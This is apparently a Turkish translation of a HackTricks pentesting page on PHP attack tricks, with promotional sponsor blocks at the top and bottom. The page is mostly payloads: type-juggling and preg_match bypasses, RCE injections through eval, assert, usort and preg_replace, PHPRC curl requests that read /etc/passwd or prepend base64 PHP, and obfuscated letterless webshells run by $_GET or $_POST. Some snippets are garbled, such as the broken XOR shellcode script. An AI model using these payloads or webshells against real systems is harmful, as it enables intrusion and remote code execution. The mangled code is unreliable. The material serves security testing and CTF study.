# PHP İpuçları

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuçlarınızı paylaşın, PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>

<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Çerezlerin yaygın konumu:

Bu aynı zamanda phpMyAdmin çerezleri için de geçerlidir.

Çerezler:
```
PHPSESSID
phpMyAdmin
```
Konumlar:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP Karşılaştırmalarını Atlatma

### Gevşek Karşılaştırmalar/Tür Dönüşümü ( == )

Eğer PHP'de `==` kullanılıyorsa, karşılaştırmanın beklenildiği gibi davranmadığı beklenmedik durumlar olabilir. Bu, "==" sadece aynı türe dönüştürülen değerleri karşılaştırır, eğer karşılaştırılan verinin türünün de aynı olduğunu karşılaştırmak istiyorsanız `===` kullanmanız gerekir.

PHP karşılaştırma tabloları: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (567).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Bir sayı ile başlamayan bir dize bir sayıya eşittir
* `"0xAAAA" == "43690" -> True` Onaltılık veya ondalık biçimdeki sayılardan oluşan dizeler, aynı sayıya/dizeye eşit olabilirler (dizedeki sayılar sayı olarak yorumlanır)
* `"0e3264578" == 0 --> True` "0e" ile başlayan ve herhangi bir şeyi takip eden bir dize 0'a eşit olacaktır
* `"0X3264578" == 0X --> True` "0" ile başlayan ve herhangi bir harfi takip eden (X herhangi bir harf olabilir) ve herhangi bir şeyi takip eden bir dize 0'a eşit olacaktır
* `"0e12334" == "0" --> True` Bu çok ilginç çünkü bazı durumlarda "0" ile başlayan ve herhangi bir harf içermeyen bir dize girişini kontrol edebilir ve bu dizeyle karşılaştırılan ve karşılaştırılan içerik oluşturabilirsiniz. Bu nedenle, "0e" ile başlayan ve herhangi bir harf içermeyen bir karmayı oluşturacak bir değer sağlayabilirseniz, karşılaştırmayı atlayabilirsiniz. Bu formatta **zaten karmalanmış dizeleri** burada bulabilirsiniz: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Bir dizideki herhangi bir harf, int 0'a eşittir

Daha fazla bilgi için [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Tür Dönüşümü**, `in_array()` fonksiyonunu da varsayılan olarak etkiler (katı bir karşılaştırma yapmak için üçüncü argümanı true olarak ayarlamanız gerekir):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Bu fonksiyon **herhangi bir kimlik doğrulama kontrolü** için kullanılıyorsa (örneğin şifre kontrolü) ve kullanıcı karşılaştırmanın bir tarafını kontrol ediyorsa, şifre değeri olarak bir dizi yerine boş bir dizi gönderebilir (`https://ornek.com/giris.php/?kullaniciadi=admin&sifre[]=`) ve bu kontrolü atlayabilir:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
### Katı Tür Dönüşümü

`strcasecmp()` ile aynı hata meydana gelir.

Eğer `===` kullanılıyorsa bile, karşılaştırmanın **tür dönüşümüne karşı savunmasız** olabileceği hatalar olabilir. Örneğin, karşılaştırma **veriyi karşılaştırmadan önce farklı bir nesne türüne dönüştürüyorsa**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** kullanıcı girişini **doğrulamak** için kullanılabilir (herhangi bir **kelime/regex**'in **kara listesinde** olup olmadığını **kontrol eder** ve eğer değilse, kod işlemini sürdürebilir).

#### Yeni satır atlatma

Ancak, regexp'in başlangıcını sınırlarken `preg_match()` **sadece kullanıcı girişinin ilk satırını kontrol eder**, sonra eğer bir şekilde girişi **birkaç satırda gönderebilirseniz**, bu kontrolü atlatmanız mümkün olabilir. Örnek:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Bu kontrolü atlamak için değeri **yeni satırlarla urlencoded** (`%0A`) gönderebilirsiniz veya **JSON verisi** gönderebiliyorsanız, bunu **birkaç satırda** gönderin:
```php
{
"cmd": "cat /etc/passwd"
}
```
Örnek bulun: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Uzunluk hatası atlatma**

(Bu atlatma, görünüşe göre PHP 5.2.5'te denenmiş ve PHP 7.3.15'te çalıştıramadım)\
Eğer `preg_match()`'e geçerli çok **büyük bir giriş** gönderebilirseniz, **işleyemez** ve kontrolü **atlayabilirsiniz**. Örneğin, eğer bir JSON'u karalistelediyse gönderebilirsiniz:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### ReDoS Atlatma

Hile kaynağı: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) ve [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Kısacası, sorun, PHP'deki `preg_*` fonksiyonlarının [PCRE kütüphanesi](http://www.pcre.org/) üzerine kurulması nedeniyle oluşur. PCRE'de belirli düzenli ifadeler, çok sayıda özyineli çağrı kullanılarak eşleştirilir, bu da çok miktarda yığın alanı kullanır. Özyineli çağrılara izin verilen miktar üzerinde bir sınır belirlemek mümkündür, ancak PHP'de bu sınır [varsayılan olarak 100.000'dir](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) ve yığın alanına sığmaktan daha fazladır.

Bu sorun hakkında daha detaylı konuşulan [bu Stackoverflow konusu](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) da gönderide paylaşıldı. Görevimiz şimdi açıktı:\
**Regex'in 100.000'den fazla özyineli çağrı yapmasını sağlayan bir giriş göndermek, SIGSEGV'ye neden olarak `preg_match()` fonksiyonunu `false` döndürmesini sağlamak ve böylece uygulamanın girişimizin kötü niyetli olmadığını düşünmesini sağlamak, yüklem sonunda `{system(<çokkötükod>)}` gibi bir sürpriz atarak SSTI --> RCE --> bayrak :)**.

Evet, regex terimleri açısından, aslında 100k "özyineli çağrı" yapmıyoruz, ancak "geri izleme adımlarını" sayıyoruz, ki bu da [PHP belgelerinde](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) belirtildiği gibi `pcre.backtrack_limit` değişkeninde varsayılan olarak 1.000.000 (1M) olur.\
Buna ulaşmak için, `'X'*500_001` 1 milyon geri izleme adımına (500k ileri ve 500k geri) yol açacaktır:
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHP obfuscation için Türkçe Karakter Dizisi Dönüşümü
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Yönlendirmeden Sonra Yürüt (EAR)

Eğer PHP başka bir sayfaya yönlendiriyorsa ancak **`die`** veya **`exit`** fonksiyonu **`Location`** başlığı ayarlandıktan sonra çağrılmamışsa, PHP yürütmeye devam eder ve verileri gövdeye ekler:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Yol Geçişi ve Dosya Dahil Etme Sömürüsü

Kontrol edin:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## Daha fazla hile

* **register\_globals**: **PHP < 4.1.1.1** sürümlerinde veya yanlış yapılandırılmışsa, **register\_globals** etkin olabilir (veya davranışları taklit ediliyor olabilir). Bu, global değişkenlerde $\_GET gibi bir değer varsa örneğin $\_GET\["param"]="1234", bu değere **$param** üzerinden erişebilirsiniz. Bu nedenle, HTTP parametreleri göndererek kod içinde kullanılan değişkenleri **üzerine yazabilirsiniz**.
* **Aynı alanın PHPSESSION çerezleri aynı yerde saklanır**, bu nedenle bir alanda **farklı yollarla farklı çerezler kullanılıyorsa**, bir yolun **diğer yolun çerezine erişmesini sağlayabilirsiniz**. Bu şekilde, **her iki yol da aynı isimde bir değişkene erişirse**, bu değişkenin değerini yol1'den yol2'ye uygulayabilirsiniz. Ve ardından yol2, yol1'in değişkenlerini geçerli kabul eder (çerezin adını yol2'de karşılık gelen adı vererek).
* Makinenin kullanıcı adlarını elde ettiğinizde. PHP dizinlerinin etkin olup olmadığını görmek için adresi kontrol edin: **/\~\<KULLANICIADı>**.
* [**Php sargıları kullanarak LFI ve RCE**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Bu fonksiyonlar genellikle PHP'de **şifrelerden karma değerler oluşturmak** ve bir şifrenin bir karma ile karşılaştırıldığında doğru olup olmadığını **kontrol etmek** için kullanılır. Desteklenen algoritmalar: `PASSWORD_DEFAULT` ve `PASSWORD_BCRYPT` (başlangıcı `$2y$`). **PASSWORD\_DEFAULT'ın genellikle PASSWORD\_BCRYPT ile aynı olduğunu** unutmayın. Ve şu anda, **PASSWORD\_BCRYPT'ın 72 bayt giriş boyutunda bir sınırlaması** vardır. Bu nedenle, bu algoritmayla 72 bayt'tan büyük bir şeyi karmaşıklaştırmaya çalıştığınızda, yalnızca ilk 72B kullanılacaktır:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP başlıklarını atlatarak PHP hatalarını istismar etme

#### Başlıklar ayarlandıktan sonra hata oluşturma

[**Bu twitter konuşmasından**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A\&s=19) görebileceğiniz gibi 1000'den fazla GET parametresi veya 1000 POST parametresi veya 20 dosya gönderildiğinde, PHP'nin yanıtta başlıkları ayarlamayacağı.

Örneğin, CSP başlıklarının ayarlandığı kodlarda atlatmaya izin verme:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### Başlıklar ayarlanmadan önce bir gövde doldurma

Eğer bir **PHP sayfası hataları yazdırıyor ve kullanıcı tarafından sağlanan bazı girdileri ekrana yazdırıyorsa**, kullanıcı PHP sunucusunun geri bazı **yeterince uzun içerik** yazdırmasını sağlayabilir, böylece yanıtın içine **başlıkları eklemeye çalıştığında sunucu bir hata fırlatacaktır**.\
Aşağıdaki senaryoda **saldırgan sunucunun büyük hatalar fırlatmasını sağladı**, ve ekran görüntüsünde görebileceğiniz gibi PHP **başlık bilgilerini değiştirmeye çalıştığında** (örneğin CSP başlığı kullanıcıya gönderilmedi):

![](<../../../.gitbook/assets/image (1085).png>)

## PHP fonksiyonlarında SSRF

Sayfayı kontrol et:

{% content-ref url="php-ssrf.md" %}
[php-ssrf.md](php-ssrf.md)
{% endcontent-ref %}

## Kod yürütme

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Daha fazla faydalı PHP fonksiyonu için buraya bakın](php-useful-functions-disable\_functions-open\_basedir-bypass/)

### **preg\_replace()** aracılığıyla RCE
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" argümanındaki kodu yürütmek için en az bir eşleşme gereklidir. Bu preg\_replace seçeneği **PHP 5.5.0'dan itibaren kullanımdan kaldırılmıştır.**

### **Eval() Aracılığıyla Uzaktan Kod Çalıştırma (RCE)**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **Assert() ile RCE**

Bu php içindeki fonksiyon, bir dize içinde yazılmış kodu **çalıştırmanıza** olanak tanır ve buna bağlı olarak **true veya false döndürür** (ve buna bağlı olarak yürütümü değiştirir). Genellikle kullanıcı değişkeni dizenin ortasına yerleştirilir. Örneğin:\
`assert("strpos($_GET['page']),'..') === false")` --> Bu durumda **RCE** elde etmek için şunu yapabilirsiniz:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
### **usort() ile RCE**

Bu fonksiyon, belirli bir işlevi kullanarak öğelerin bir dizisini sıralamak için kullanılır.\
Bu fonksiyonu kötüye kullanmak için:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
**//** kullanarak kodun geri kalanını yorumlayabilirsiniz.

Kapatmanız gereken parantez sayısını keşfetmek için:

- `?order=id;}//`: Bir hata mesajı alırız (`Parse error: syntax error, unexpected ';'`). Muhtemelen bir veya daha fazla parantez eksik.
- `?order=id);}//`: Bir **uyarı** alırız. Bu doğru gibi görünüyor.
- `?order=id));}//`: Bir hata mesajı alırız (`Parse error: syntax error, unexpected ')' i`). Muhtemelen fazla kapanış parantezimiz var.

### **.httaccess** Üzerinden Uzaktan Kod Çalıştırma (RCE)

Eğer bir **.htaccess** dosyası **yükleyebilirseniz**, o zaman birçok şeyi **yapılandırabilir** ve hatta kodu çalıştırabilirsiniz (bu dosyaların uzantısı .htaccess olan dosyaların **çalıştırılabilir** olabileceğini yapılandırabilirsiniz).

Farklı .htaccess kabukları [burada bulunabilir](https://github.com/wireghoul/htshells)

### Çevre Değişkenleri Üzerinden Uzaktan Kod Çalıştırma (RCE)

Eğer PHP'de **çevre değişkenlerini değiştirmenize izin veren bir zayıflık bulursanız** (ve başka bir dosya yükleme zayıflığı da bulursanız, ancak daha fazla araştırma ile bunun atlatılabileceği belki), bu davranışı **RCE** elde etmek için kötüye kullanabilirsiniz.

- [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Bu çevre değişkeni, diğer ikili dosyaları çalıştırırken keyfi kütüphaneleri yüklemenize izin verir (ancak bu durumda işe yaramayabilir).
- **`PHPRC`** : PHP'ye **yapılandırma dosyasını nerede bulacağını söyler**, genellikle `php.ini` olarak adlandırılır. Kendi yapılandırma dosyanızı yükleyebiliyorsanız, o zaman `PHPRC`'yi ona işaret etmek için kullanın. İkinci yüklenen bir dosyayı belirten **`auto_prepend_file`** girdisini ekleyin. Bu ikinci dosya normal **PHP kodunu içerir, ardından diğer kodlardan önce PHP çalışma zamanı tarafından yürütülür**.
1. Kabuk kodumuzu içeren bir PHP dosyası yükleyin
2. İkinci adımda yüklediğimiz dosyayı yürütmesi için PHP ön işleyicisine talimat veren bir ikinci dosya yükleyin, **`auto_prepend_file`** yönergesi içerir
3. `PHPRC` değişkenini ikinci adımda yüklediğimiz dosyaya ayarlayın.
- Bu zinciri nasıl yürüteceğiniz hakkında daha fazla bilgi edinin [**orijinal rapordan**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
- **PHPRC** - başka bir seçenek
- Eğer **dosya yükleyemiyorsanız**, FreeBSD'de "dosya" `/dev/fd/0`'ı kullanabilirsiniz, bu **`stdin`** içeren bir **`stdin`'e gönderilen isteğin gövdesi**:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
- Veya RCE almak için **`allow_url_include`**'ı etkinleştirin ve **base64 PHP kodu** içeren bir dosyayı öne ekleyin:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
- Teknik [**bu rapordan**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## PHP Statik analiz

Bu fonksiyonlara çağrılarda kod ekleyip ekleyemediğinizi kontrol edin ([buradan](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Eğer bir PHP uygulamasını hata ayıklıyorsanız, `/etc/php5/apache2/php.ini` dosyasına `display_errors = On` ekleyerek hata yazdırmayı global olarak etkinleştirebilir ve apache'yi yeniden başlatabilirsiniz: `sudo systemctl restart apache2`

### PHP Kodunu Deobfuscate Etme

PHP kodunu deobfuscate etmek için **web**[ **www.unphp.net**](http://www.unphp.net) **adresini kullanabilirsiniz.**

## PHP Wrapper'lar ve Protokoller

PHP Wrapper'lar ve protokoller, bir sistemin yazma ve okuma korumalarını **atlayarak** tehlikeye atabilir. [**Daha fazla bilgi için bu sayfaya bakın**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug kimlik doğrulamasız RCE

Eğer bir `phpconfig()` çıktısında **Xdebug**'in **etkin** olduğunu görürseniz, [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit) üzerinden RCE almaya çalışmalısınız.

## Değişken değişkenler
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## Yeni $\_GET\["a"]\($\_GET\["b"] kullanarak RCE suiistimali

Eğer bir sayfada **herhangi bir sınıfın yeni bir nesnesini oluşturabiliyorsanız**, RCE elde edebilirsiniz, nasıl yapılacağını öğrenmek için aşağıdaki sayfayı kontrol edin:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Harfler olmadan PHP çalıştırma

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Sekizliği kullanarak
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (Exclusive OR) işlemi, iki bitin değerlerine göre gerçekleşen bir mantıksal işlemdir. XOR işlemi, yalnızca girdilerden biri 1 olduğunda 1 üretir. Bu işlem, veri şifreleme ve karşılaştırma gibi birçok alanda kullanılır.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR basit kabuk kodu

[**Bu yazıda**](https://mgp25.com/ctf/Web-challenge/) belirtildiğine göre, aşağıdaki şekilde basit bir kabuk kodu oluşturmak mümkündür:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Yani, eğer **sayı ve harf olmadan keyfi PHP kodu çalıştırabiliyorsanız**, aşağıdaki gibi bir istek gönderebilir ve keyfi PHP kodunu çalıştırmak için bu yükü istismar edebilirsiniz:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Daha detaylı bir açıklama için [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (eval içinde)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl gibi
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Sıfırdan kahramana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**The PEASS Family**]'yi keşfedin(https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
